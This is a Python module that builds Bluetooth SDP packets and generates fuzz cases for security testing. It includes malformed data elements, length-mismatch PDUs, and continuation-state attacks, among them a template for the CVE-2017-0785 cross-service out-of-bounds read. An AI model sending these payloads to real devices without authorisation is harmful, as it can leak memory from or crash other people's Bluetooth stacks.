"""SDP (Service Discovery Protocol) packet builder and fuzz case generator.

Constructs well-formed and malformed SDP PDUs for protocol-aware fuzzing.
All multi-byte fields are big-endian per Bluetooth Core Spec Vol 3, Part B.

SDP runs on L2CAP PSM 0x0001. PDU header is 5 bytes:
  PDU ID (1) + Transaction ID (2 BE) + Parameter Length (2 BE)

This module provides:
  - Data element encoders (DTD-typed TLV values)
  - PDU header and request builders
  - Continuation state constructors
  - Fuzz case generators for data elements, PDU fields, and continuation state attacks

Reference: Bluetooth Core Spec v5.4, Vol 3, Part B (SDP)
CVE targets: CVE-2017-0785 (Android), CVE-2017-1000250 (BlueZ)
"""

from __future__ import annotations

import struct
from typing import Callable


# ---------------------------------------------------------------------------
# Data Type Descriptor (DTD) byte constants
# Header byte = (TypeDescriptor << 3) | SizeIndex
# ---------------------------------------------------------------------------

# Type 0: Nil
DTD_NIL = 0x00

# Type 1: Unsigned Integer
DTD_UINT8 = 0x08
DTD_UINT16 = 0x09
DTD_UINT32 = 0x0A
DTD_UINT64 = 0x0B
DTD_UINT128 = 0x0C

# Type 2: Signed Integer
DTD_SINT8 = 0x10
DTD_SINT16 = 0x11
DTD_SINT32 = 0x12
DTD_SINT64 = 0x13
DTD_SINT128 = 0x14

# Type 3: UUID
DTD_UUID16 = 0x19
DTD_UUID32 = 0x1A
DTD_UUID128 = 0x1C

# Type 4: Text String (variable-length with size prefix)
DTD_STR8 = 0x25
DTD_STR16 = 0x26
DTD_STR32 = 0x27

# Type 5: Boolean
DTD_BOOL = 0x28

# Type 6: Data Element Sequence (variable-length with size prefix)
DTD_DES8 = 0x35
DTD_DES16 = 0x36
DTD_DES32 = 0x37

# Type 7: Data Element Alternative (variable-length with size prefix)
DTD_DEA8 = 0x3D
DTD_DEA16 = 0x3E
DTD_DEA32 = 0x3F

# Type 8: URL (variable-length with size prefix)
DTD_URL8 = 0x45
DTD_URL16 = 0x46
DTD_URL32 = 0x47

# DTD bit masks
TYPE_DESC_MASK = 0xF8
SIZE_DESC_MASK = 0x07


# ---------------------------------------------------------------------------
# SDP PDU IDs (Bluetooth Core Spec Vol 3, Part B, Section 4)
# ---------------------------------------------------------------------------

SDP_ERROR_RSP = 0x01
SDP_SERVICE_SEARCH_REQ = 0x02
SDP_SERVICE_SEARCH_RSP = 0x03
SDP_SERVICE_ATTR_REQ = 0x04
SDP_SERVICE_ATTR_RSP = 0x05
SDP_SERVICE_SEARCH_ATTR_REQ = 0x06
SDP_SERVICE_SEARCH_ATTR_RSP = 0x07

# Human-readable names for logging/reporting
PDU_NAMES: dict[int, str] = {
    SDP_ERROR_RSP: "ErrorResponse",
    SDP_SERVICE_SEARCH_REQ: "ServiceSearchRequest",
    SDP_SERVICE_SEARCH_RSP: "ServiceSearchResponse",
    SDP_SERVICE_ATTR_REQ: "ServiceAttributeRequest",
    SDP_SERVICE_ATTR_RSP: "ServiceAttributeResponse",
    SDP_SERVICE_SEARCH_ATTR_REQ: "ServiceSearchAttributeRequest",
    SDP_SERVICE_SEARCH_ATTR_RSP: "ServiceSearchAttributeResponse",
}


# ---------------------------------------------------------------------------
# SDP Error Codes (Bluetooth Core Spec Vol 3, Part B, Section 4.4.1)
# ---------------------------------------------------------------------------

SDP_ERR_INVALID_VERSION = 0x0001
SDP_ERR_INVALID_HANDLE = 0x0002
SDP_ERR_INVALID_SYNTAX = 0x0003
SDP_ERR_INVALID_PDU_SIZE = 0x0004
SDP_ERR_INVALID_CONTINUATION = 0x0005
SDP_ERR_INSUFFICIENT_RESOURCES = 0x0006

ERROR_NAMES: dict[int, str] = {
    SDP_ERR_INVALID_VERSION: "SDP_Invalid_SDP_Version",
    SDP_ERR_INVALID_HANDLE: "SDP_Invalid_Service_Record_Handle",
    SDP_ERR_INVALID_SYNTAX: "SDP_Invalid_Request_Syntax",
    SDP_ERR_INVALID_PDU_SIZE: "SDP_Invalid_PDU_Size",
    SDP_ERR_INVALID_CONTINUATION: "SDP_Invalid_Continuation_State",
    SDP_ERR_INSUFFICIENT_RESOURCES: "SDP_Insufficient_Resources",
}


# ---------------------------------------------------------------------------
# Standard Protocol and Service Class UUIDs (UUID16)
# ---------------------------------------------------------------------------

# Protocol UUIDs
UUID_SDP = 0x0001
UUID_L2CAP = 0x0100
UUID_RFCOMM = 0x0003
UUID_OBEX = 0x0008
UUID_BNEP = 0x000F
UUID_AVCTP = 0x0017
UUID_AVDTP = 0x0019
UUID_ATT = 0x0007

# Service Class UUIDs
UUID_SPP = 0x1101
UUID_HFP = 0x111E
UUID_HFP_AG = 0x111F
UUID_A2DP_SRC = 0x110A
UUID_A2DP_SINK = 0x110B
UUID_AVRCP = 0x110E
UUID_PBAP_PCE = 0x112E
UUID_PBAP_PSE = 0x112F
UUID_PBAP = 0x1130
UUID_MAP_MSE = 0x1132
UUID_MAP_MCE = 0x1133
UUID_MAP = 0x1134
UUID_HID = 0x1124
UUID_PANU = 0x1115
UUID_NAP = 0x1116

# Convenience list of all standard UUIDs for fuzzing iteration
ALL_UUIDS: list[int] = [
    UUID_SDP, UUID_L2CAP, UUID_RFCOMM, UUID_OBEX, UUID_BNEP,
    UUID_AVCTP, UUID_AVDTP, UUID_ATT,
    UUID_SPP, UUID_HFP, UUID_HFP_AG, UUID_A2DP_SRC, UUID_A2DP_SINK,
    UUID_AVRCP, UUID_PBAP_PCE, UUID_PBAP_PSE, UUID_PBAP,
    UUID_MAP_MSE, UUID_MAP_MCE, UUID_MAP, UUID_HID, UUID_PANU, UUID_NAP,
]


# ===========================================================================
# Data Element Encoders
# ===========================================================================

def encode_nil() -> bytes:
    """Encode a Nil data element (type 0, size index 0, no data)."""
    return bytes([DTD_NIL])


def encode_uint8(value: int) -> bytes:
    """Encode an unsigned 8-bit integer data element."""
    return bytes([DTD_UINT8, value & 0xFF])


def encode_uint16(value: int) -> bytes:
    """Encode an unsigned 16-bit integer data element (big-endian)."""
    return bytes([DTD_UINT16]) + struct.pack(">H", value & 0xFFFF)


def encode_uint32(value: int) -> bytes:
    """Encode an unsigned 32-bit integer data element (big-endian)."""
    return bytes([DTD_UINT32]) + struct.pack(">I", value & 0xFFFFFFFF)


def encode_uint64(value: int) -> bytes:
    """Encode an unsigned 64-bit integer data element (big-endian)."""
    return bytes([DTD_UINT64]) + struct.pack(">Q", value & 0xFFFFFFFFFFFFFFFF)


def encode_sint8(value: int) -> bytes:
    """Encode a signed 8-bit integer data element."""
    return bytes([DTD_SINT8]) + struct.pack(">b", value)


def encode_sint16(value: int) -> bytes:
    """Encode a signed 16-bit integer data element (big-endian)."""
    return bytes([DTD_SINT16]) + struct.pack(">h", value)


def encode_sint32(value: int) -> bytes:
    """Encode a signed 32-bit integer data element (big-endian)."""
    return bytes([DTD_SINT32]) + struct.pack(">i", value)


def encode_uuid16(value: int) -> bytes:
    """Encode a UUID16 data element (big-endian)."""
    return bytes([DTD_UUID16]) + struct.pack(">H", value & 0xFFFF)


def encode_uuid32(value: int) -> bytes:
    """Encode a UUID32 data element (big-endian)."""
    return bytes([DTD_UUID32]) + struct.pack(">I", value & 0xFFFFFFFF)


def encode_uuid128(value: bytes) -> bytes:
    """Encode a UUID128 data element (16 raw bytes, big-endian).

    Args:
        value: Exactly 16 bytes representing the UUID128.

    Raises:
        ValueError: If value is not exactly 16 bytes.
    """
    if len(value) != 16:
        raise ValueError(f"UUID128 must be 16 bytes, got {len(value)}")
    return bytes([DTD_UUID128]) + value


def encode_string(value: str) -> bytes:
    """Encode a text string data element (UTF-8, variable-length prefix).

    Uses uint8 length prefix for strings <= 255 bytes,
    uint16 prefix for strings <= 65535 bytes,
    uint32 prefix for longer strings.
    """
    raw = value.encode("utf-8")
    if len(raw) <= 0xFF:
        return bytes([DTD_STR8, len(raw)]) + raw
    elif len(raw) <= 0xFFFF:
        return bytes([DTD_STR16]) + struct.pack(">H", len(raw)) + raw
    else:
        return bytes([DTD_STR32]) + struct.pack(">I", len(raw)) + raw


def encode_bool(value: bool) -> bytes:
    """Encode a boolean data element (1 byte: 0x00 or 0x01)."""
    return bytes([DTD_BOOL, 0x01 if value else 0x00])


def encode_des(elements: list[bytes]) -> bytes:
    """Encode a Data Element Sequence containing pre-encoded elements.

    Uses uint8 length prefix for body <= 255 bytes,
    uint16 prefix for body <= 65535 bytes,
    uint32 prefix for longer bodies.

    Args:
        elements: List of already-encoded data elements to wrap in a DES.
    """
    body = b"".join(elements)
    if len(body) <= 0xFF:
        return bytes([DTD_DES8, len(body)]) + body
    elif len(body) <= 0xFFFF:
        return bytes([DTD_DES16]) + struct.pack(">H", len(body)) + body
    else:
        return bytes([DTD_DES32]) + struct.pack(">I", len(body)) + body


def encode_dea(elements: list[bytes]) -> bytes:
    """Encode a Data Element Alternative containing pre-encoded elements.

    Uses uint8 length prefix for body <= 255 bytes,
    uint16 prefix for body <= 65535 bytes,
    uint32 prefix for longer bodies.

    Args:
        elements: List of already-encoded data elements to wrap in a DEA.
    """
    body = b"".join(elements)
    if len(body) <= 0xFF:
        return bytes([DTD_DEA8, len(body)]) + body
    elif len(body) <= 0xFFFF:
        return bytes([DTD_DEA16]) + struct.pack(">H", len(body)) + body
    else:
        return bytes([DTD_DEA32]) + struct.pack(">I", len(body)) + body


def encode_url(value: str) -> bytes:
    """Encode a URL data element (ASCII/UTF-8, variable-length prefix).

    Uses uint8 length prefix for URLs <= 255 bytes,
    uint16 prefix for URLs <= 65535 bytes,
    uint32 prefix for longer URLs.
    """
    raw = value.encode("utf-8")
    if len(raw) <= 0xFF:
        return bytes([DTD_URL8, len(raw)]) + raw
    elif len(raw) <= 0xFFFF:
        return bytes([DTD_URL16]) + struct.pack(">H", len(raw)) + raw
    else:
        return bytes([DTD_URL32]) + struct.pack(">I", len(raw)) + raw


# ===========================================================================
# PDU Builder
# ===========================================================================

def build_sdp_pdu(pdu_id: int, transaction_id: int, params: bytes) -> bytes:
    """Build a complete SDP PDU with 5-byte header.

    PDU format:
      Byte 0:     PDU ID (uint8)
      Bytes 1-2:  Transaction ID (uint16 BE)
      Bytes 3-4:  Parameter Length (uint16 BE)
      Bytes 5+:   Parameters

    Args:
        pdu_id: SDP PDU type (0x01-0x07 for valid PDUs).
        transaction_id: Client-chosen transaction identifier.
        params: Raw parameter bytes (already encoded).

    Returns:
        Complete PDU bytes ready to send over L2CAP PSM 1.
    """
    return struct.pack(">BHH", pdu_id, transaction_id, len(params)) + params


# ===========================================================================
# Request Builders
# ===========================================================================

def build_service_search_req(
    uuids: list[int],
    max_count: int = 0xFFFF,
    continuation: bytes = b"\x00",
    tid: int = 1,
) -> bytes:
    """Build a ServiceSearchRequest PDU (0x02).

    Parameters:
      - ServiceSearchPattern: DES of UUID16 values (max 12 UUIDs per spec)
      - MaxServiceRecordCount: uint16 BE
      - ContinuationState: InfoLength + info bytes

    Args:
        uuids: List of UUID16 values to search for (max 12 per spec).
        max_count: Maximum number of service record handles to return.
        continuation: Raw continuation state bytes (default: no continuation).
        tid: Transaction ID.
    """
    pattern = encode_des([encode_uuid16(u) for u in uuids])
    params = pattern + struct.pack(">H", max_count) + continuation
    return build_sdp_pdu(SDP_SERVICE_SEARCH_REQ, tid, params)


def build_service_attr_req(
    handle: int,
    max_bytes: int = 0xFFFF,
    attr_ranges: list[tuple[int, int]] | None = None,
    continuation: bytes = b"\x00",
    tid: int = 1,
) -> bytes:
    """Build a ServiceAttributeRequest PDU (0x04).

    Parameters:
      - ServiceRecordHandle: uint32 BE
      - MaximumAttributeByteCount: uint16 BE
      - AttributeIDList: DES of uint16 (single ID) or uint32 (range: hi16=start, lo16=end)
      - ContinuationState

    Args:
        handle: Service record handle to query.
        max_bytes: Maximum bytes of attribute data to return.
        attr_ranges: List of (start, end) attribute ID ranges. Default: all (0x0000-0xFFFF).
        continuation: Raw continuation state bytes.
        tid: Transaction ID.
    """
    if attr_ranges is None:
        attr_ranges = [(0x0000, 0xFFFF)]
    attrs = encode_des([encode_uint32((start << 16) | end) for start, end in attr_ranges])
    params = (
        struct.pack(">I", handle)
        + struct.pack(">H", max_bytes)
        + attrs
        + continuation
    )
    return build_sdp_pdu(SDP_SERVICE_ATTR_REQ, tid, params)


def build_service_search_attr_req(
    uuids: list[int],
    max_bytes: int = 0xFFFF,
    attr_ranges: list[tuple[int, int]] | None = None,
    continuation: bytes = b"\x00",
    tid: int = 1,
) -> bytes:
    """Build a ServiceSearchAttributeRequest PDU (0x06).

    Parameters:
      - ServiceSearchPattern: DES of UUID16 values
      - MaximumAttributeByteCount: uint16 BE
      - AttributeIDList: DES of uint16/uint32
      - ContinuationState

    Args:
        uuids: List of UUID16 values to search for.
        max_bytes: Maximum bytes of attribute data to return.
        attr_ranges: List of (start, end) attribute ID ranges. Default: all (0x0000-0xFFFF).
        continuation: Raw continuation state bytes.
        tid: Transaction ID.
    """
    if attr_ranges is None:
        attr_ranges = [(0x0000, 0xFFFF)]
    pattern = encode_des([encode_uuid16(u) for u in uuids])
    attrs = encode_des([encode_uint32((start << 16) | end) for start, end in attr_ranges])
    params = pattern + struct.pack(">H", max_bytes) + attrs + continuation
    return build_sdp_pdu(SDP_SERVICE_SEARCH_ATTR_REQ, tid, params)


# ===========================================================================
# Continuation State Builders
# ===========================================================================

def build_continuation(info_bytes: bytes = b"") -> bytes:
    """Build a continuation state field.

    Format: InfoLength (1 byte) + Information (InfoLength bytes).
    InfoLength=0 means no continuation (request/response complete).

    Args:
        info_bytes: Implementation-specific continuation data (0-16 bytes per spec).
    """
    return bytes([len(info_bytes)]) + info_bytes


def build_continuation_oversized(size: int = 17) -> bytes:
    """Build a continuation state with InfoLength exceeding the spec maximum of 16.

    Tests whether the SDP server validates InfoLength bounds.

    Args:
        size: InfoLength value (must be > 16 to be oversized). Padded with 0xFF.
    """
    return bytes([size]) + b"\xFF" * size


# ===========================================================================
# Data Element Fuzz Generators
# ===========================================================================

def fuzz_invalid_dtd_bytes() -> list[bytes]:
    """Generate all 256 possible DTD header bytes with minimal dummy data.

    Covers:
      - Reserved type descriptors (9-31): undefined per spec
      - Invalid type/size combinations (e.g., UUID with size_idx 0 or 3)
      - Bool with non-zero size index
      - Nil with non-zero size index

    Returns:
        List of raw byte sequences, each a single malformed data element.
    """
    cases: list[bytes] = []
    for dtd in range(256):
        type_desc = (dtd >> 3) & 0x1F
        size_idx = dtd & 0x07

        # Reserved type descriptors (9-31) -- all undefined
        if type_desc >= 9:
            cases.append(bytes([dtd, 0x01]))  # 1 byte dummy data

        # UUID with invalid size index: 0 (unspecified) or 3 (8 bytes, not a UUID size)
        elif type_desc == 3 and size_idx in (0, 3):
            cases.append(bytes([dtd]) + b"\xFF" * 8)

        # Bool with non-zero size index (spec: size_idx must be 0)
        elif type_desc == 5 and size_idx != 0:
            cases.append(bytes([dtd]) + b"\xFF" * 4)

        # Nil with non-zero size index (spec: size_idx must be 0)
        elif type_desc == 0 and size_idx != 0:
            cases.append(bytes([dtd]) + b"\xFF" * 4)

        # String/DES/DEA/URL with size index 0-4 (only 5-7 are valid)
        elif type_desc in (4, 6, 7, 8) and size_idx <= 4:
            cases.append(bytes([dtd]) + b"\xFF" * 4)

        # UInt/SInt with variable-length size index (5-7 are not valid for integers)
        elif type_desc in (1, 2) and size_idx >= 5:
            cases.append(bytes([dtd, 0x04]) + b"\xFF" * 4)

    return cases


def fuzz_nested_des(depth: int = 100) -> bytes:
    """Generate a deeply nested DES structure (depth bomb).

    Creates a DES containing a DES containing a DES... to the specified depth.
    Tests stack-based parsers for stack overflow or excessive recursion.

    Args:
        depth: Number of nesting levels. Default 100.

    Returns:
        Nested DES byte sequence with a UInt8(0x42) at the innermost level.
    """
    result = encode_uint8(0x42)  # Innermost value
    for _ in range(depth):
        result = bytes([DTD_DES8, len(result)]) + result
    return result


def fuzz_des_size_overflow() -> bytes:
    """Generate a DES that claims more bytes than are actually present.

    DES header says 255 bytes follow, but only 4 bytes of data are present.
    Tests bounds checking on DES length field parsing.
    """
    return bytes([DTD_DES8, 0xFF]) + b"\x08\x01\x08\x02"


def fuzz_string_size_overflow() -> bytes:
    """Generate a String element with size field exceeding actual data.

    String header claims 255 bytes, but only 5 bytes ("Hello") follow.
    Tests bounds checking on string length field parsing.
    """
    return bytes([DTD_STR8, 0xFF]) + b"Hello"


def fuzz_all_type_size_combos() -> list[bytes]:
    """Generate systematic test cases for every valid and invalid type x size combination.

    Iterates all 8 type descriptors (0-8) against all 8 size indices (0-7),
    producing both valid and invalid combinations with appropriate dummy data.

    Returns:
        List of raw byte sequences covering the full DTD matrix.
    """
    cases: list[bytes] = []

    # Size index -> how many data bytes to supply for fixed-size types
    fixed_sizes = {0: 1, 1: 2, 2: 4, 3: 8, 4: 16}
    # Size index 5-7 use length prefixes: 1, 2, 4 bytes respectively
    var_prefix_sizes = {5: 1, 6: 2, 7: 4}

    for type_desc in range(9):  # 0=Nil through 8=URL
        for size_idx in range(8):
            dtd = (type_desc << 3) | size_idx

            if size_idx in fixed_sizes:
                data_len = fixed_sizes[size_idx]
                cases.append(bytes([dtd]) + b"\x01" * data_len)

                # Valid Nil encoding: DTD byte only, no data (0 bytes per spec).
                # The case above (Nil + 1 byte dummy) is kept as a fuzz case to
                # test how parsers handle unexpected data after Nil.
                if type_desc == 0 and size_idx == 0:
                    cases.append(bytes([0x00]))  # Nil DTD, no payload

            elif size_idx in var_prefix_sizes:
                # Variable-length: provide a small length prefix + data
                prefix_len = var_prefix_sizes[size_idx]
                data = b"\x41" * 4  # 4 bytes of 'A'
                if prefix_len == 1:
                    length_bytes = bytes([len(data)])
                elif prefix_len == 2:
                    length_bytes = struct.pack(">H", len(data))
                else:
                    length_bytes = struct.pack(">I", len(data))
                cases.append(bytes([dtd]) + length_bytes + data)

    return cases


# ===========================================================================
# SDP Request Fuzz Generators
# ===========================================================================

def fuzz_parameter_length_mismatch() -> list[bytes]:
    """Generate PDUs where ParameterLength does not match actual parameter bytes.

    Tests:
      - Header claims 100 bytes, only 10 sent
      - Header claims 0 bytes, actual parameters present
      - Header claims 0xFFFF bytes, minimal data sent

    Returns:
        List of raw malformed PDU bytes.
    """
    # Build a normal ServiceSearchRequest's parameters
    normal_params = (
        encode_des([encode_uuid16(UUID_L2CAP)])
        + struct.pack(">H", 0xFFFF)
        + b"\x00"
    )

    cases: list[bytes] = []

    # ParameterLength says 100, actual is len(normal_params)
    cases.append(struct.pack(">BHH", SDP_SERVICE_SEARCH_REQ, 1, 100) + normal_params)

    # ParameterLength says 0, actual params present
    cases.append(struct.pack(">BHH", SDP_SERVICE_SEARCH_REQ, 1, 0) + normal_params)

    # ParameterLength says 0xFFFF, only normal_params sent
    cases.append(
        struct.pack(">BHH", SDP_SERVICE_SEARCH_REQ, 1, 0xFFFF) + normal_params
    )

    # ParameterLength says 0, no params at all
    cases.append(struct.pack(">BHH", SDP_SERVICE_SEARCH_REQ, 1, 0))

    # ParameterLength matches but truncated: header says 10, send 10 bytes of garbage
    cases.append(struct.pack(">BHH", SDP_SERVICE_SEARCH_REQ, 1, 10) + b"\xFF" * 10)

    return cases


def fuzz_max_count_boundary() -> list[bytes]:
    """Generate ServiceSearchRequests with boundary MaxServiceRecordCount values.

    Tests: 0 (possible division-by-zero), 1 (minimum), 0xFFFF (maximum).
    """
    cases: list[bytes] = []
    for max_count in (0, 1, 0xFFFF):
        cases.append(build_service_search_req(
            [UUID_L2CAP], max_count=max_count, tid=1,
        ))
    return cases


def fuzz_max_bytes_boundary() -> list[bytes]:
    """Generate ServiceAttributeRequests with boundary MaxAttributeByteCount values.

    Tests:
      - 0: Zero bytes requested
      - 6: Below minimum valid (7 per spec)
      - 7: Minimum valid
      - 0xFFFF: Maximum
    """
    cases: list[bytes] = []
    for max_bytes in (0, 6, 7, 0xFFFF):
        cases.append(build_service_attr_req(
            handle=0x00010000, max_bytes=max_bytes, tid=1,
        ))
    return cases


def fuzz_handle_boundary() -> list[bytes]:
    """Generate ServiceAttributeRequests with boundary ServiceRecordHandle values.

    Tests:
      - 0x00000000: SDP server's own record handle
      - 0xFFFFFFFF: Maximum possible handle (likely non-existent)
    """
    cases: list[bytes] = []
    for handle in (0x00000000, 0xFFFFFFFF):
        cases.append(build_service_attr_req(handle=handle, tid=1))
    return cases


def fuzz_empty_patterns() -> list[bytes]:
    """Generate requests with empty ServiceSearchPattern or AttributeIDList.

    Tests:
      - Empty DES (0 UUIDs) in ServiceSearchRequest
      - Empty DES (0 attribute ranges) in ServiceAttributeRequest
      - Empty DES in both fields of ServiceSearchAttributeRequest
    """
    empty_des = encode_des([])  # 0x35 0x00

    cases: list[bytes] = []

    # Empty ServiceSearchPattern
    params = empty_des + struct.pack(">H", 0xFFFF) + b"\x00"
    cases.append(build_sdp_pdu(SDP_SERVICE_SEARCH_REQ, 1, params))

    # Empty AttributeIDList
    params = struct.pack(">I", 0x00010000) + struct.pack(">H", 0xFFFF) + empty_des + b"\x00"
    cases.append(build_sdp_pdu(SDP_SERVICE_ATTR_REQ, 1, params))

    # Both empty in ServiceSearchAttributeRequest
    params = empty_des + struct.pack(">H", 0xFFFF) + empty_des + b"\x00"
    cases.append(build_sdp_pdu(SDP_SERVICE_SEARCH_ATTR_REQ, 1, params))

    return cases


def fuzz_too_many_uuids() -> list[bytes]:
    """Generate ServiceSearchRequests with more than 12 UUIDs (spec maximum).

    Tests:
      - 13 UUIDs: just over the limit
      - 24 UUIDs: double the limit
      - 50 UUIDs: extreme overflow

    Returns:
        List of PDU bytes with oversized ServiceSearchPattern.
    """
    cases: list[bytes] = []
    for count in (13, 24, 50):
        # Use sequential UUID16 values starting from 0x0001
        uuids = list(range(0x0001, 0x0001 + count))
        cases.append(build_service_search_req(uuids, tid=1))
    return cases


def fuzz_reserved_pdu_ids() -> list[bytes]:
    """Generate PDUs with reserved/undefined PDU IDs.

    PDU IDs 0x00 and 0x08-0xFF are reserved per spec.
    Tests how the SDP server handles unknown PDU types.
    """
    # Minimal valid-looking params for each
    dummy_params = encode_des([encode_uuid16(UUID_L2CAP)]) + struct.pack(">H", 1) + b"\x00"

    cases: list[bytes] = []

    # PDU ID 0x00 (reserved)
    cases.append(build_sdp_pdu(0x00, 1, dummy_params))

    # PDU IDs 0x08-0xFF (reserved)
    for pdu_id in (0x08, 0x10, 0x20, 0x40, 0x80, 0xFE, 0xFF):
        cases.append(build_sdp_pdu(pdu_id, 1, dummy_params))

    return cases


def fuzz_response_as_request() -> list[bytes]:
    """Generate response PDUs (0x03, 0x05, 0x07) sent to the server as if they were requests.

    Tests how the server handles receiving its own response PDU types.
    """
    cases: list[bytes] = []

    # ServiceSearchResponse (0x03) with dummy response data
    # TotalCount(2) + CurrentCount(2) + HandleList(4*N) + Continuation
    rsp_params = struct.pack(">HH", 1, 1) + struct.pack(">I", 0x00010000) + b"\x00"
    cases.append(build_sdp_pdu(SDP_SERVICE_SEARCH_RSP, 1, rsp_params))

    # ServiceAttributeResponse (0x05) with dummy data
    # AttrListByteCount(2) + AttrList(DES) + Continuation
    attr_list = encode_des([encode_uint16(0x0000), encode_uint32(0x00010000)])
    rsp_params = struct.pack(">H", len(attr_list)) + attr_list + b"\x00"
    cases.append(build_sdp_pdu(SDP_SERVICE_ATTR_RSP, 1, rsp_params))

    # ServiceSearchAttributeResponse (0x07) with dummy data
    cases.append(build_sdp_pdu(SDP_SERVICE_SEARCH_ATTR_RSP, 1, rsp_params))

    return cases


# ===========================================================================
# Continuation State Attack Generators
# ===========================================================================

def generate_continuation_attacks(initial_cont_state: bytes) -> list[bytes]:
    """Generate continuation state attack variants from an initial server-provided state.

    Produces variants for testing server-side continuation state validation:
      - Baseline: replay the original continuation state
      - Zero offset: all zero bytes (same length)
      - Max offset: all 0xFF bytes (same length)
      - Oversized: InfoLength > 16 (spec maximum)
      - Way oversized: InfoLength = 255
      - Incremental sweep: all single-byte or two-byte offsets (0x00-0xFF)

    Args:
        initial_cont_state: Raw continuation info bytes from a server response
                           (NOT including the InfoLength prefix byte).

    Returns:
        List of complete continuation state fields (InfoLength + info bytes),
        ready to append to request parameters.
    """
    cont_len = len(initial_cont_state)
    attacks: list[bytes] = [
        build_continuation(initial_cont_state),         # Baseline replay
        build_continuation(b"\x00" * cont_len),         # Zero offset
        build_continuation(b"\xFF" * cont_len),         # Max offset
        build_continuation_oversized(17),               # Exceed max InfoLength
        build_continuation_oversized(255),              # Way oversized
    ]

    # Incremental sweep: probe every offset 0x00-0xFF
    # High-byte sweep: varies high byte, low byte = 0x00
    for i in range(256):
        if cont_len == 1:
            attacks.append(build_continuation(bytes([i])))
        elif cont_len == 2:
            attacks.append(build_continuation(struct.pack(">H", i * 256)))
        elif cont_len >= 3:
            # Set the first two bytes to the sweep value, keep rest from original
            attacks.append(build_continuation(
                struct.pack(">H", i * 256) + initial_cont_state[2:]
            ))

    # Low-byte sweep: varies low byte, high byte = 0x00 (doubles coverage)
    for i in range(256):
        if cont_len == 2:
            attacks.append(build_continuation(struct.pack(">H", i)))
        elif cont_len >= 3:
            attacks.append(build_continuation(
                struct.pack(">H", i) + initial_cont_state[2:]
            ))

    # Strategic 2-byte boundary values
    if cont_len >= 2:
        for value in (0x0000, 0x0001, 0x00FF, 0x0100, 0x7FFF, 0x8000, 0xFFFE, 0xFFFF):
            if cont_len == 2:
                attacks.append(build_continuation(struct.pack(">H", value)))
            else:
                attacks.append(build_continuation(
                    struct.pack(">H", value) + initial_cont_state[2:]
                ))

    return attacks


def generate_cross_service_attack() -> list[tuple[bytes, Callable[[bytes], bytes]]]:
    """Generate CVE-2017-0785 pattern templates: cross-service continuation state reuse.

    The attack captures a continuation state from a request for UUID A (which
    returns many results, producing a large response buffer), then replays that
    continuation state in a request for UUID B (which returns fewer results,
    with a smaller buffer). If the server uses the continuation state as a raw
    memory offset, this causes an out-of-bounds read from the smaller buffer.

    Returns:
        List of (initial_request, followup_factory) tuples where:
          - initial_request: ServiceSearchRequest for UUID A to obtain continuation state
          - followup_factory: Callable that takes raw continuation state bytes and returns
                            a ServiceSearchRequest for UUID B with that state attached
    """
    uuid_pairs: list[tuple[int, int]] = [
        (UUID_L2CAP, UUID_SDP),
        (UUID_L2CAP, UUID_RFCOMM),
        (UUID_PBAP, UUID_L2CAP),
        (UUID_HFP, UUID_PBAP),
    ]

    results: list[tuple[bytes, Callable[[bytes], bytes]]] = []
    for uuid_a, uuid_b in uuid_pairs:
        initial_req = build_service_search_req([uuid_a], max_count=1, tid=1)

        def _make_followup(target_uuid: int) -> Callable[[bytes], bytes]:
            def followup(cont_state: bytes) -> bytes:
                return build_service_search_req(
                    [target_uuid],
                    max_count=256,
                    continuation=build_continuation(cont_state),
                    tid=2,
                )
            return followup

        results.append((initial_req, _make_followup(uuid_b)))

    return results


# ===========================================================================
# Master Generator
# ===========================================================================

def generate_all_sdp_fuzz_cases() -> list[bytes]:
    """Generate a combined list of all SDP fuzz payloads.

    Collects outputs from all fuzz generators into a single flat list.
    Each entry is a raw byte sequence (either a data element or complete PDU)
    suitable for sending over L2CAP PSM 1.

    Returns:
        List of fuzz case bytes. Typical count: ~400-600 cases depending
        on configuration.
    """
    cases: list[bytes] = []

    # Data element malformations
    cases.extend(fuzz_invalid_dtd_bytes())
    cases.append(fuzz_nested_des(depth=100))
    cases.append(fuzz_des_size_overflow())
    cases.append(fuzz_string_size_overflow())
    cases.extend(fuzz_all_type_size_combos())

    # PDU-level attacks
    cases.extend(fuzz_parameter_length_mismatch())
    cases.extend(fuzz_max_count_boundary())
    cases.extend(fuzz_max_bytes_boundary())
    cases.extend(fuzz_handle_boundary())
    cases.extend(fuzz_empty_patterns())
    cases.extend(fuzz_too_many_uuids())
    cases.extend(fuzz_reserved_pdu_ids())
    cases.extend(fuzz_response_as_request())

    # Continuation state attacks (using a synthetic 2-byte initial state)
    cases.extend(generate_continuation_attacks(b"\x00\x20"))

    return cases
